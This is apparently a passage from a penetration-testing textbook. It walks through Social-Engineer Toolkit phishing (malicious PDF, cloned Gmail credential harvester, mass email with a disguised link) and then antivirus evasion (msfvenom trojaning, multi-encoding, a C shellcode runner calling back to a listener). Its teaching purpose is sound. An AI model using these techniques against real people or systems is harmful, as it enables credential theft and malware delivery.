Select option 1 to choose Spear-Phishing Attack Vectors u. The SpearPhishing Attack Vectors menu is shown in Listing 11-3. 
 1) Perform a Mass Email Attack u
 2) Create a FileFormat Payload v
 3) Create a Social-Engineering Template w
246 Chapter 11
--snip--
 99) Return to Main Menu
set:phishing> 1
Listing 11-3: Choose Perform a Mass Email Attack
The first option, Perform a Mass Email Attack u, allows us to send a malicious file to a predefined email address or list of addresses as well as set up 
a Metasploit listener for the selected payload. The second option, Create a 
FileFormat Payload v, lets us create a malicious file with a Metasploit payload. 
The third option allows us to create a new email template w to be used in 
SET attacks. 
Choose option 1 to create an email attack. (We‚Äôll have the option to 
send a single email or mass email later.)
Choosing a Payload
Now to choose a payload. A selection of payload options is shown in 
Listing 11-4. 
 ********** PAYLOADS **********
 1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)
--snip--
 12) Adobe util.printf() Buffer Overflow u
--snip--
 20) MSCOMCTL ActiveX Buffer Overflow (ms12-027)
set:payloads> 12
Listing 11-4: Choose a spear-phishing attack
For example, to re-create our PDF attack from Chapter 10, choose 
option 12: Adobe util.printf() Buffer Overflow u. (SET includes many 
Metasploit attacks, as well as its own, specific attacks.)
You should be prompted to choose a payload for your malicious file 
(see Listing 11-5). 
1) Windows Reverse TCP Shell Spawn a command shell on victim and 
 send back to attacker
2) Windows Meterpreter Reverse_TCP Spawn a meterpreter shell on victim 
 and send back to attacker u
--snip--
set:payloads> 2
Listing 11-5: Choose a payload
Social Engineering 247
The usual suspects are all here, including windows/meterpreter/reverse_tcp, 
which appears in a more human-readable form as Windows Meterpreter Reverse_
TCP u. We‚Äôll choose this option for our sample attack.
Setting Options
SET should prompt for the relevant options for the payload, in this case the 
LHOST and LPORT. If you‚Äôre not very familiar with Metasploit, just answer the 
prompts to set the correct options automatically, as shown in Listing 11-6. 
Set the payload listener to the IP address of Kali Linux. Leave the port to 
connect back on to the default (443).
set> IP address for the payload listener: 192.168.20.9
set:payloads> Port to connect back on [443]:
[-] Defaulting to port 443...
[-] Generating fileformat exploit...
[*] Payload creation complete.
[*] All payloads get sent to the /usr/share/set/src/program_junk/template.pdf 
directory
[-] As an added bonus, use the file-format creator in SET to create your 
attachment.
Listing 11-6: Setting options
Naming Your File
Next you should be prompted to name your malicious file. 
Right now the attachment will be imported with filename of 'template.whatever'
 Do you want to rename the file?
 example Enter the new filename: moo.pdf
 1. Keep the filename, I don't care.
 2. Rename the file, I want to be cool. u
set:phishing> 2
set:phishing> New filename: bulbsecuritysalaries.pdf
[*] Filename changed, moving on...
Select option 2 u to rename the malicious PDF, and enter the filename 
bulbsecuritysalaries.pdf. SET should continue.
Single or Mass Email
Now to decide whether to have SET send our malicious file to a single email 
address or a list of addresses, as shown in Listing 11-7. 
248 Chapter 11
 Social Engineer Toolkit Mass E-Mailer
 What do you want to do:
 1. E-Mail Attack Single Email Address u
 2. E-Mail Attack Mass Mailer v
 99. Return to main menu.
 
set:phishing> 1
Listing 11-7: Choosing to perform a single email address attack 
Choose the single email address option u for now. (We‚Äôll look at sending mass email v in ‚ÄúMass Email Attacks‚Äù on page 253.)
Creating the Template
When crafting the email, we can use one of SET‚Äôs email templates or enter 
text for one-time use in the template. In addition, if you choose Create a 
Social-Engineering Template, you can create a template that you can reuse. 
Many of my social engineering customers like me to use fake emails 
that appear to come from a company executive or the IT manager, announcing new website functionality or a new company policy. Let‚Äôs use one of 
SET‚Äôs email templates as an example to fake this email now, as shown in 
Listing 11-8; we‚Äôll create our own email later in the chapter. 
 Do you want to use a predefined template or craft a one time email 
template. 
 1. Pre-Defined Template
 2. One-Time Use Email Template
set:phishing> 1
[-] Available templates:
1: Strange internet usage from your computer
2: Computer Issue
3: New Update
4: How long has it been
5: WOAAAA!!!!!!!!!! This is crazy...
6: Have you seen this?
7: Dan Brown's Angels & Demons
8: Order Confirmation
9: Baby Pics
10: Status Report
set:phishing> 5
Listing 11-8: Choosing an email template
Choose 1 for Pre-Defined Template, then choose template 5.
Setting the Target
Now SET should prompt you for your target email address and a mail server 
for use in delivering the attack email. You can use your own mail server, one 
Social Engineering 249
that is misconfigured to allow anyone to send mail (called an open relay), 
or a Gmail account, as shown in Listing 11-9. Let‚Äôs use Gmail for this attack 
by choosing option 1. 
set:phishing> Send email to: georgia@metasploit.com
 1. Use a gmail Account for your email attack.
 2. Use your own server or open relay
set:phishing> 1
set:phishing> Your gmail email address: georgia@bulbsecurity.com
set:phishing> The FROM NAME user will see: Georgia Weidman
Email password: 
set:phishing> Flag this message/s as high priority? [yes|no]: no
[!] Unable to deliver email. Printing exceptions message below, this is most 
likely due to an illegal attachment. If using GMAIL they inspect PDFs and is 
most likely getting caught. u
[*] SET has finished delivering the emails
Listing 11-9: Sending email with SET
When prompted, enter the email address and password for your Gmail 
account. SET should attempt to deliver the message. But as you can see in 
the message at the bottom of the listing, Gmail inspects attachments and 
catches our attack u. 
That‚Äôs just a first attempt, of course. You may get better results using 
your own mail server or your client‚Äôs mail server, if you can gather or guess 
the credentials.
Of course, in this example, I‚Äôm just sending emails to myself. We 
looked at tools such as theHarvester to find valid email addresses to target 
in Chapter 5. 
Setting Up a Listener
We can also have SET set up a Metasploit listener to catch our payload 
if anyone opens the email attachment. Even if you‚Äôre not familiar with 
Metasploit syntax, you should be able to use SET to set up this attack based 
on the options we chose in ‚ÄúSetting Options‚Äù on page 247. You can see 
that SET uses a resource file to automatically set the payload, LHOST, and 
LPORT options based on our previous answers when building the payload 
(see Listing 11-10). 
set:phishing> Setup a listener [yes|no]: yes
Easy phishing: Set up email templates, landing pages and listeners
in Metasploit Pro's wizard -- type 'go_pro' to launch it now.
 =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops
[*] Processing src/program_junk/meta_config for ERB directives.
resource (src/program_junk/meta_config)> use exploit/multi/handler
250 Chapter 11
resource (src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/
reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (src/program_junk/meta_config)> set LHOST 192.168.20.9
LHOST => 192.168.20.9
resource (src/program_junk/meta_config)> set LPORT 443
LPORT => 443
--snip--
resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
msf exploit(handler) > 
[*] Started reverse handler on 192.168.20.9:443 
[*] Starting the payload handler...
Listing 11-10: Setting up a listener 
Now we wait for a curious user to open our malicious PDF and send us 
a session. Use ctrl-C to close the listener and type exit to move back to the 
previous menu. Option 99 will take you back to SET‚Äôs Social-Engineering 
Attacks menu.
Web Attac
In this section we‚Äôll look at web-based attacks. Return to the SocialEngineering Attacks menu (Listing 11-2), and choose option 2 (Website 
Attack Vectors). This is the sort of attack that I use most often in pentests 
that have a social-engineering component because it emulates many socialengineering attacks seen in the wild. 
You should be presented with a list of web-based attacks as shown in 
Listing 11-11. 
 1) Java Applet Attack Method
 2) Metasploit Browser Exploit Method
 3) Credential Harvester Attack Method
 4) Tabnabbing Attack Method
--snip--
 99) Return to Main Menu
set:webattack> 3
Listing 11-11: SET website attacks 
Here‚Äôs a description of some of the attacks:
‚Ä¢	 The Java Applet Attack Method automates the Java-signed applet attack 
we used in Chapter 10. 
‚Ä¢	 The Metasploit Browser Exploit Method allows you to use all of 
Metasploit‚Äôs browser-exploitation client-side attacks without having 
to set parameters manually, by knowing Metasploit syntax. 
Social Engineering 251
‚Ä¢	 The Credential Harvester Attack Method helps create websites to trick 
users into giving up their credentials. 
‚Ä¢	 The Tabnabbing Attack Method relies on users‚Äô propensity to build 
up a collection of open browser tabs. When the user first opens the 
attack page, it says ‚ÄúPlease wait.‚Äù Naturally, the user switches back to 
another tab while he waits. Once the attack tab is no longer in focus, it 
loads the attack site (which can be a clone of any website you like), with 
the goal of tricking the user into supplying his credentials or otherwise 
interacting with the malicious site. The assumption is that the user will 
use the first tab he encounters that looks legitimate. 
Choose option 3, the Credential Harvester Attack Method.
Next you should see a prompt asking what sort of website you would 
like. We can choose from some prebuilt web templates, clone a website from 
the Internet with Site Cloner, or import a custom web page with Custom 
Import. Choose option 1 to use a SET template (see Listing 11-12).
 1) Web Templates
 2) Site Cloner
 3) Custom Import
--snip--
 99) Return to Webattack Menu
set:webattack> 1
Listing 11-12: SET website template options
Now enter the IP address for the website to post credentials back to. We 
can just use the local IP address for the Kali virtual machine, but if you use 
this attack against a client, you will need an Internet-facing IP address. 
IP Address for the POST back in Harvester: 192.168.20.9
Now choose a template. Because we want to trick users into entering their credentials, choose a template with a login field, such as Gmail 
(option 2), as shown in Listing 11-13. SET should now start a web server 
with our fake Gmail page, a clone of the actual Gmail page. 
 1. Java Required 
 2. Gmail
 3. Google
 4. Facebook
 5. Twitter
 6. Yahoo
set:webattack> Select a template: 2
[*] Cloning the website: https://gmail.com
[*] This could take a little bit...
252 Chapter 11
The best way to use this attack is if the username and password form fields 
are available. Regardless, this captures all POSTs on a website.
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
Listing 11-13: Setting up the site
Now browse to the cloned Gmail site at the Kali Linux web server and 
enter some credentials to see how this works. After entering credentials you 
should be redirected to the real Gmail site. To a user it will just seem like he 
typed in his password incorrectly. In the meantime, back in SET, you should 
see a result that looks something like Listing 11-14.
192.168.20.10 - - [10/May/2015 12:58:02] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
PARAM: ltmpl=default
--snip--
PARAM: GALX=oXwT1jDgpqg
POSSIBLE USERNAME FIELD FOUND: Email=georgiau
POSSIBLE PASSWORD FIELD FOUND: Passwd=passwordv
--snip--
PARAM: asts=
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
Listing 11-14: SET capturing credentials
When the user submits the page, SET highlights the fields that it thinks 
are interesting. In this case, it found the Email u and Passwd v that were 
submitted. Once you shut down the web server with ctrl-C to end the web 
attack, the results should be written to a file. 
When combined with the email attack discussed next, this is a great 
attack to use to gather credentials for a pentest or, at the very least, test the 
security awareness of your client‚Äôs employees. 
Note that this attack can be even more interesting if you use option 5, 
Site Cloner, to make a copy of your customer‚Äôs site. If they do not have a 
page with a login form of some sort (VPN, webmail, blogging, and so on) 
you can even create one. Clone their site, and add a simple HTML form 
like this: 
<form name="input" action=‚Äúindex.html" method="post">
Username: <input type="text" name="username"><br>
Password: <input type="password" name="pwd"><br>
<input type="submit" value="Submit"><br>
</form>
Then use option 3, Custom Import, to have SET serve your modified page.
Social Engineering 253
Mass Email Atta
Now to use SET to automate phishing email attacks. Create a file and enter 
a few email addresses, one per line, as shown here. 
root@kali:~# cat emails.txt
georgia@bulbsecurity.com
georgia@grmn00bs.com
georgia@metasploit.com
Now return to the main SET Social-Engineering Attacks menu with 
option 99 (Listing 11-2) and choose option 5, Mass Mailer Attack. Large carbon copy or blind carbon copy lists can trigger spam filters or tip off users 
that something is amiss, and emailing a long list of client employees individually by hand can be tedious, so we‚Äôll use SET to email multiple addresses 
(see Listing 11-15). Scripts are good for repetitive tasks like this. 
set> 5
 1. E-Mail Attack Single Email Address
 2. E-Mail Attack Mass Mailer
--snip--
 99. Return to main menu.
 
set:mailer> 2
--snip--
set:phishing> Path to the file to import into SET: /root/emails.txtu
Listing 11-15: Setting up an email attack
Choose option 2 and enter the name of the email address file to 
import u. 
Next we need to choose a server (see Listing 11-16). Let‚Äôs use Gmail 
again‚Äîoption 1. When prompted, enter your credentials. 
1. Use a gmail Account for your email attack.
2. Use your own server or open relay
set:phishing> 1
set:phishing> Your gmail email address: georgia@bulbsecurity.com
set:phishing> The FROM NAME the user will see: Georgia Weidman
Email password: 
set:phishing> Flag this message/s as high priority? [yes|no]: no
Listing 11-16: Logging in to Gmail
You should be asked to create the email to send, as shown in Listing 11-17. 
set:phishing> Email subject: Company Web Portal
set:phishing> Send the message as html or plain? 'h' or 'p': hu
[!] IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.
set:phishing> Enter the body of the message, type END (capitals) when finished: All
254 Chapter 11
Next line of the body:
Next line of the body: We are adding a new company web portal. Please go to <a href= 
"192.168.20.9">http://www.bulbsecurity.com/webportal</a> and use your Windows domain 
credentials to log in.
Next line of the body:
Next line of the body: Bulb Security Administrator
Next line of the body: END
[*] Sent e-mail number: 1 to address: georgia@bulbsecurity.com
[*] Sent e-mail number: 2 to address: georgia@grmn00bs.com
[*] Sent e-mail number: 3 to address: georgia@metasploit.com
[*] Sent e-mail number: 4 to address: 
[*] SET has finished sending the emails
 Press <return> to continue
Listing 11-17: Sending the email
When asked whether to make the email plaintext or HTML, choose h
for HTML u. By using HTML for the email, we‚Äôll be better able to hide the 
real destination of the links in the email behind graphics and such. 
Now to enter the text for the email. Because we chose HTML as the 
email format, we can use HTML tags in our email. For example, this code 
creates a link for the recipient to click: <a href="192.168.20.9">http://www
.bulbsecurity.com/webportal</a>. The text displayed indicates that the link 
goes to http://www.bulbsecurity.com/webportal, but the link will really open 
192.168.20.9 in the browser. We control the website at 192.168.20.9, so we 
can put a browser exploit or a phishing attack there. Add some text to the 
email to convince users to click the included link. This is where you can be 
particularly creative. For example, in Listing 11-17, we inform the users that 
a new company portal has been added, and they should log in with their 
domain credentials to check it out. On a pentest, a better way to approach 
this would be to register a variation of the company‚Äôs domain name 
(bulb-security.com) or perhaps use a slight misspelling (bulbsecurty.com)
that is likely to go unnoticed by users and host your social-engineering 
site there. 
After you finish the email, press ctrl-C to send it. The email will be
sent to each address in the emails.txt file we entered earlier.
Recipients will see this email: 
All,
We are adding a new company web portal. Please go to http://
www.bulbsecurity.com/webportal and use your Windows domain 
credentials to log in.
Bulb Security Administrator 
While a security-savvy user should know better than to click links in 
emails that are not from a trusted source, and would know how to verify 
where a link points to before clicking it, not all users are that savvy, and 
even the savvy ones aren‚Äôt always paying attention. In fact, I have never 
launched a social-engineering test that failed. 
Social Engineering 255
Multipronged Attack
Let‚Äôs combine our previous two attacks (credential harvesting and phishing 
emails) to trick employees into submitting their credentials to a pentestercontrolled site. We‚Äôll use an email attack together with a web attack to send 
users to our attacker-controlled site by tricking them into clicking links in 
the emails.
But first we need to change an option in SET‚Äôs configuration file. In 
Kali this file is at /usr/share/set/config/set_config. The option to change is 
WEB_ATTACK_EMAIL, which by default is set to OFF. Open the config file in a text 
editor and change this option to ON. 
### Set to ON if you want to use Email in conjunction with webattack
WEBATTACK_EMAIL=ON
Now try running the Credential Harvesting attack again. Instead of 
using a template, you can clone one of your client‚Äôs web pages if they have 
a login site, such as webmail or an employee portal. If the client uses a web 
page and not a login site, use the Custom Import option to build your own page 
that looks like the employee‚Äôs web page with a login form added. 
Summar
In this chapter we‚Äôve looked at only a couple of social-engineering attacks 
that we can automate with SET. The scripts for your attacks will change 
based on your clients‚Äô needs. Some clients may have a specific attack scenario in mind, or you may find the need to run multiple attacks at once. For 
instance, you may create a multipronged attack where you harvest credentials and the malicious website runs a malicious Java applet. In addition to 
the web-based attacks and malicious files we looked at here, SET can create other attacks, such as USB sticks, QR codes, and rogue wireless access 
points.

12
Bypassin A ni v i r 
Appli c ati
Your pentesting clients will most likely be running 
some sort of antivirus solution. So far in this book 
we‚Äôve avoided having any of our malicious executables 
deleted by antivirus applications, but antivirus program 
avoidance is a constantly changing field. Typically you 
will be more likely to avoid detection by using a memory-corruption exploit 
and loading your payload directly into memory‚Äîthat is, by never touching 
the disk. That said, with the attack landscape shifting to emphasize clientside and social-engineering attacks, it may not always be possible to avoid 
writing your payload to disk. In this chapter we‚Äôll look at a few techniques 
for obscuring our malware to try to avoid detection when the payload is 
written to the disk. 
258 Chapter 12
Trojan
In Chapter 4, we created a standalone malicious executable that runs a 
Metasploit payload. Though we may be able to use social engineering to 
trick a user into downloading and running our malicious file, the lack of 
any functionality other than our executable‚Äôs payload could tip off users 
that something is amiss. We‚Äôd be much more likely to evade detection if we 
could hide our payload inside of some legitimate program that would run 
normally, with our payload running in the background. Such a program 
is called a trojan, after the legendary wooden horse that ended the Trojan 
War. The horse appeared to be an innocuous offering to the gods and was 
brought inside the previously impenetrable walled city of Troy, with enemy 
soldiers hiding inside, ready to attack.
We encountered a trojan in Chapter 8: The Vsftpd server on our Ubuntu 
target had a backdoor that could be triggered at login by entering a smiley 
face as part of the username. Attackers compromised the source code repositories for Vsftpd and added additional trojan functionality to the program. 
Anyone who downloaded Vsftpd from the official repositories between the 
initial compromise and detection ended up with a trojaned version. 
Msfvenom
Although reverse-engineering binaries or gaining access to source code 
and manually adding trojan code is beyond the scope of this book, the 
Msfvenom tool has some options we can use to embed a Metasploit payload 
inside a legitimate binary. Listing 12-1 shows some important options we 
have not encountered previously in the text.
root@kali:~# msfvenom -h
Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val>
Options:
 -p, --payload [payload] Payload to use. Specify a '-' or stdin to 
 use custom payloads
--snip--
 u-x, --template [path] Specify a custom executable file to use 
 as a template
 v-k, --keep Preserve the template behavior and inject 
 the payload as a new thread
--snip--
Listing 12-1: Msfvenom help page 
In particular, the -x flag u allows us to use an executable file as a 
template in which to embed our chosen payload. However, though the 
resulting executable will look like the original one, the added payload will 
pause the execution of the original, and we shouldn‚Äôt expect a user to run 
Bypassing Antivirus Applications 259
an executable that appears to hang at startup very many times. Luckily, 
Msfvenom‚Äôs -k flag v will keep the executable template intact and run our 
payload in a new thread, allowing the original executable to run normally. 
Let‚Äôs use the -x and -k flags to build a trojaned Windows executable 
that will appear normal to a user but which will send us a Meterpreter session in the background. To do so, we choose the payload with the -p flag 
and set the relevant payload options as in Chapter 4. Any legitimate executable will do; you‚Äôll find some useful Windows binaries for pentesting in Kali 
Linux at /usr/share/windows-binaries. 
To embed our payload inside the radmin.exe binary enter:
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe
Our Msfvenom command specifies the payload to generate with the 
-p option. We set the LHOST option to the IP address of Kali, the system to 
call back to when the payload runs. We can also set the LPORT option. As 
discussed in this section, the -x option selects an executable in which to 
embed our payload. The -k option runs the payload in a separate thread. 
The -f flag tells Msfvenom to build the payload in the executable format. 
Once created, run the trojaned binary on either the Windows XP or 
Windows 7 target. The Radmin Viewer program should appear to run 
normally (Figure 12-1), but the embedded payload should give us a Meterpreter session if we set up a handler using the multi/handler module. 
Figure 12-1: Trojaned Radmin Viewer executable
260 Chapter 12
Checking for Trojans with the 
Our trojaned binary should convince the average user that the program is legitimate. Security-savvy users should verify the integrity of a downloaded file before
running it by checking its MD5 hash against the value published by the vendor, 
where available. An MD5 hash is a kind of file fingerprint; if changes are made
to the file, the MD5 hash will change
Let‚Äôs compare the MD5 hashes of the original radmin.exe with our trojaned 
version. In Kali Linux, the md5sum program will calculate a file‚Äôs MD5 hash. Ru
md5sum on both binaries, and you‚Äôll find that the hash values are dramatically 
different, as you can see here at u and v
root@kali:~# md5sum /usr/share/windows-binaries/radmin.exe
u2d219cc28a406dbfa86c3301e8b93146 /usr/share/windows-binaries/radmin.exe
root@kali:~# md5sum radmin.exe
v4c2711cc06b6fcd300037e3cbdb3293b radmin.exe 
However, the MD5 hashing algorithm is not perfect, and a tampered 
binary could have the same MD5 hash as the original file, which is known as 
an MD5 collision attack. For this reason, many vendors publish a Secure Hash
Algorithm (SHA) hash as well
Of course, checking two separate hash values is better than checking one
The SHA family contains multiple hashing algorithms, and the version used will 
vary among vendors. Kali comes with programs for various SHA hashes. Fo
example, sha512sum calculates the 64-bit block size SHA-2 hash, as shown here
root@kali:~# sha512sum /usr/share/windows-binaries/radmin.exe
5a5c6d0c67877310d40d5210ea8d515a43156e0b3e871b16faec192170acf29c9cd4e495d2e03b8d
7ef10541b22ccecd195446c55582f735374fb8df16c94343 /usr/share/windows-binaries/
radmin.exe
root@kali:~# sha512sum radmin.exe
f9fe3d1ae405cc07cd91c461a1c03155a0cdfeb1d4c0190be1fb350d43b4039906f8abf4db592b060
d5cd15b143c146e834c491e477718bbd6fb9c2e96567e88 radmin.exe
When installing software, be sure to calculate the hash(es) of your downloaded version, and compare it to the value(s) published by the vendor
How Antivirus Applications 
Before we try different techniques to get our Metasploit payloads past an 
antivirus program, let‚Äôs discuss how these programs work. Most antivirus 
solutions start by comparing potentially dangerous code to a set of patterns 
and rules that make up the antivirus definitions, which match known malicious code. Antivirus definitions are updated regularly as new malware is 
identified by each vendor. This sort of identification is called static analysis.
Bypassing Antivirus Applications 261
In addition to static analysis against a set of signatures, more advanced 
antivirus solutions also test for malicious activity, called dynamic analysis. For 
example, a program that tries to replace every file on the hard drive or connects to a known botnet command and control server every 30 seconds is 
exhibiting potentially malicious activity and may be flagged. 
N ote Some antivirus products, such as Google‚Äôs Bouncer, run new apps that are uploaded
to the Google Play store and pass static analysis in an isolated sandbox to try to detect 
malicious activity that doesn‚Äôt have a known malicious signature. 
Microsoft Security Essenti
As we use different methods in this section to bring down our detection 
rate, keep in mind that even if you not able to get a 0 percent detection 
rate among all antivirus vendors, if you know which antivirus solution 
is deployed in your client‚Äôs environment, you can focus your efforts on 
clearing just that antivirus program. In this chapter, we will try to bypass 
Microsoft Security Essentials using various methods. 
When we created our Windows 7 target in Chapter 1, we installed 
Microsoft Security Essentials, but we didn‚Äôt turn on real-time protection to 
scan files as they are downloaded or installed. Now let‚Äôs turn on this protection to see if we can create an undetectable trojan. Open Microsoft Security 
Essentials, select the Settings tab, choose Real-time protection, and check 
the box to turn on the service, as shown in Figure 12-2. Click Save changes.
Figure 12-2: Microsoft Security Essentials real-time protection
262 Chapter 12
As of this writing, even free antivirus solutions like Microsoft Security 
Essentials do a good job of catching Metasploit payloads. For a real test, try 
installing the trojaned radmin.exe with real-time protection turned on. You 
should see a pop-up at the bottom-right corner of the screen, like the one 
shown in Figure 12-3. The file is automatically deleted before the user can 
run it‚Äîthat certainly puts a damper on things. 
Figure 12-3: Malicious software detected 
VirusTotal
One way to see which antivirus solutions will flag a program as malicious is 
to upload the file in question to the VirusTotal website (https://www.virustotal
.com/). As of this writing, VirusTotal scans uploaded files with 51 antivirus 
programs and reports which ones detect malware. VirusTotal is shown in 
Figure 12-4.
Figure 12-4: VirusTotal
To see which antivirus programs detect our trojaned radmin.exe as 
currently written, upload the file to VirusTotal and click Scan it!. Because 
antivirus definitions are constantly updated, your results will differ, but as 
you can see in Figure 12-5, 25 of 51 scanners detected our file as malicious. 
(The bottom of the page shows which scanners detected the malware.) 
Bypassing Antivirus Applications 263
Figure 12-5: Trojaned binary antivirus detection
N ote VirusTotal shares uploaded binaries with antivirus vendors so they can write signatures to match. Antivirus companies use VirusTotal signatures to improve their
detection engines, so anything you upload to the site may be caught by antivirus software just because you uploaded it. To avoid that risk, you can install the antivirus 
product on a virtual machine and test your trojans manually against it, as we did in the 
previous section. 
Getting Past an Antivirus Progr
Clearly if we want to get past antivirus solutions, we need to try harder to 
hide. Let‚Äôs look at some other useful ways to hide our Metasploit payloads 
besides simply placing them inside of an executable. 
Encoding 
Encoders are tools that allow you to avoid characters in an exploit that 
would break it. (You‚Äôll learn more about these requirements when we write 
our own exploits in Chapters 16 through 19.) At the time of this writing, 
Metasploit supports 32 encoders. Encoders mangle the payload and prepend decoding instructions to be executed in order to decode the payload 
before it is run. It is a common misperception that Metasploit‚Äôs encoders 
were designed to help bypass antivirus programs. Some Metasploit encoders create polymorphic code, or mutating code, which ensures that the 
encoded payload looks different each time the payload is generated. This 
process makes it more difficult for antivirus vendors to create signatures 
for the payload, but as we will see, it is not enough to bypass most antivirus 
solutions. 
264 Chapter 12
To list all of the encoders available in Msfvenom, use the -l encoders
option, as shown in Listing 12-2. 
root@kali:~# msfvenom -l encoders
Framework Encoders
==================
 Name Rank Description
 ---- ---- ----------- 
 cmd/generic_sh good Generic Shell Variable Substitution Command Encoder
 cmd/ifs low Generic ${IFS} Substitution Command Encoder
--snip‚Äî
 ux86/shikata_ga_nai excellent Polymorphic XOR Additive Feedback Encoder
--snip--
Listing 12-2: Msfvenom encoders 
The only encoder with an excellent rank is x86/shikata_ga_nai u. 
Shikata Ga Nai is Japanese for ‚ÄúIt can‚Äôt be helped.‚Äù Encoder rankings are 
based on the entropy level of the output. With shikata_ga_nai, even the 
decoder stub is polymorphic. The nitty-gritty details of how this encoder 
works are beyond the scope of this book, but suffice it to say that it mangles 
payloads beyond easy recognition. 
Tell Msfvenom to use the shikata_ga_nai encoder with the -e flag, as 
shown in Listing 12-3. Additionally, for further obfuscation, we‚Äôll run our 
payload through an encoder multiple times, encoding the output from the 
previous round with the -i flag and specifying the number of encoding 
rounds (10 in this case). 
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > meterpreterencoded.exe
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 344 (iteration=2)
--snip--
[*] x86/shikata_ga_nai succeeded with size 533 (iteration=9)
[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)
Listing 12-3: Creating an encoded executable with Msfvenom 
Now upload the resulting binary to VirusTotal. As you can see in Figure 12-6, 35 of the tested antivirus products detected our payload, even 
with the encoding. That‚Äôs a higher detection rate than we found when 
embedding our payload inside a prebuilt executable. In other words, 
shikata_ga_nai alone doesn‚Äôt do the trick.
Bypassing Antivirus Applications 265
Figure 12-6: VirusTotal results for an encoded binary
To see if we can improve our results, we can try experimenting with 
using multiple Metasploit encoders on our payload. For example, we 
can combine multiple rounds of shikata_ga_nai with another Metasploit 
encoder, x86/bloxor, as shown in Listing 12-4. 
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2345 -e x86/shikata_ga_nai -i 10 -f rawu > meterpreterencoded.binv
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
--snip--
[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)
root@kali:~# msfvenom -p -w -f exe -a x86x --platform windowsy -e x86/bloxor 
-i 2 > meterpretermultiencoded.exe < meterpreterencoded.binz
[*] x86/bloxor succeeded with size 638 (iteration=1)
[*] x86/bloxor succeeded with size 712 (iteration=2)
Listing 12-4: Multiencoding with Msfvenom 
This time, we start out with Msfvenom using the windows/meterpreter/
reverse_tcp payload as usual and encode it with shikata_ga_nai, as in the previous example. However, instead of setting the format to .exe, we output in 
raw format u. Also, instead of outputting the results to an .exe file as we did 
previously, this time we output the raw bytes into a .bin file v. 
266 Chapter 12
Now we take the results of the shikata_ga_nai encoding and encode it 
with the x86/bloxor encoder. Our syntax for Msfvenom will differ from what 
we are used to. First, we set the payload to null with the option -p - w. And, 
because we are not setting a payload, we need to tack on two new options to 
tell Msfvenom how to encode our input: -a x86 x to specify the architecture 
as 32 bit, and --platform windows y to specify the Windows platform. Finally, 
at the end of the Msfvenom command, we use the < symbol to pipe the .bin
file from the previous command as input into Msfvenom z. The resulting 
executable will be encoded with shikata_ga_nai and x86/bloxor. 
The resulting executable is detected by 33 antivirus programs on 
VirusTotal as of this writing‚Äîslightly better than shikata_ga_nai by itself. 
You may be able to improve your results by experimenting with different 
sets of encoders and chaining more than two encoders together, or by combining techniques. For example, what if we both embed our payload in a 
binary and encode it with shikata_ga_nai as shown here?
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -e x86/shikata_ga_nai 
-i 10 -f exe > radminencoded.exe
This gave only a slight improvement: The payload was detected by 
21 antivirus programs. And, unfortunately, Microsoft Security Essentials 
flagged both executables as malicious, as shown in Figure 12-7. We need to 
look beyond Metasploit encoders if we‚Äôre going to get past antivirus detection on our Windows 7 target. 
Figure 12-7: Microsoft is still flagging this binary as malicious.
Custom Cross Compiling 
As the de facto standard for penetration testing, Metasploit gets a fair 
amount of attention from antivirus vendors who make detecting the signatures for payloads generated by Msfvenom a priority. When Msfvenom 
creates an executable, it uses prebuilt templates that antivirus vendors can 
use to build detection signatures. 
Perhaps we can improve our ability to bypass antivirus solutions by compiling an executable ourselves using raw shellcode. Let‚Äôs start with a simple 
Bypassing Antivirus Applications 267
C template, as shown in Listing 12-5. (We discussed the basics of C programming in Chapter 3. Review that section if this program doesn‚Äôt make 
sense to you.) Save this code to a file called custommeterpreter.c.
#include <stdio.h>
unsigned char random[]= u
unsigned char shellcode[]= v
int main(void) w
{ 
 ((void (*)())shellcode)();
}
Listing 12-5: Custom executable template 
We need to fill in data for the variables random u and shellcode v, which 
are both unsigned character arrays. Our hope is that adding some randomness and compiling our own C code will be enough to trick antivirus programs. The random variable will introduce some randomness to the template. 
The shellcode variable will hold the raw hexadecimal bytes of the payload we 
create with Msfvenom. The main function w runs when our compiled C program starts and executes our shellcode. 
Create your payload in Msfvenom as usual, except this time set the format with the -f flag to c, as shown in Listing 12-6. This will create hex bytes 
that we can drop into our C file.
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2345 -f c -e x86/shikata_ga_nai -i 5
unsigned char buf[] = 
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
--snip--
"\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
"\x85\xf6\x75\xec\xc3";
Listing 12-6: Creating a raw payload in C format 
Finally, we need to add some randomness. A good place to find randomness on a Linux system is in the /dev/urandom file. This file is specifically 
designed as a pseudorandom number generator; it generates data using 
entropy in the Linux system. 
